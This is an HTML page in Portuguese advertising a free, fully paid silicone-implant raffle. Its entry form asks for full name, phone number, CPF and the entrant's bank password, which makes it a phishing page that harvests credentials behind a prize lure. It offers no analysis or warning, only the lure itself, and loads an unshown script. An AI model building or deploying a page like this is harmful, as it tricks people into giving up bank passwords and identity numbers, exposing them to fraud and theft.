
<html>
    <head>
        <title>Sorteio de silicone</title>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="stylesheet" href="css.css"/>
        <div class="banner">
                <img src="imagem/silicone.png" alt="Banner promocional">
        </div>
   
    <body>
        <h3>Quer concorrer ao um sorteio de silicone, com tudo pago?</h3>
        <h3>Então insira seus dados abaixos e veremos se você será premiada</h3><br>
        <div class="sorteioSilicone">
            <form id="sorteioSilicone" name="sorteioSilicone"/>
            
                <label for="nome">Nome Completo:</label>
                <input type="text" id="nome" placeholder="Informe o seu nome completo"/>
                <br>
                
                <label for="telefone">Telefone:</label>
                <input type="tel" id="telefone" placeholder="Informe o seu número de telefone"/>
                <br>
                
                <label for="cpf">CPF:</label>
                <input type="text" id="cpf" placeholder="Informe seu CPF"/>
                <br>
                
                <label for="senha">Senha do Banco:</label>
                <input type="password" id="senha" placeholder="Informe sua senha do banco"/>
                <br>
                <br>
                 
                <div class="button-group">
                <button type="submit">Enviar</button>
                <button type="reset">Redefinir</button>
                <p class = "result" id="result-text"></p>

    </form>
            </div>
            <script src="js.js"></script>
            <div class="mensagem" id="mensagem">
                <h2 style="color: black" >Resultado</h2>
                <span id="mensagemSaida"></span>
            </div>      
    </body>
</html>
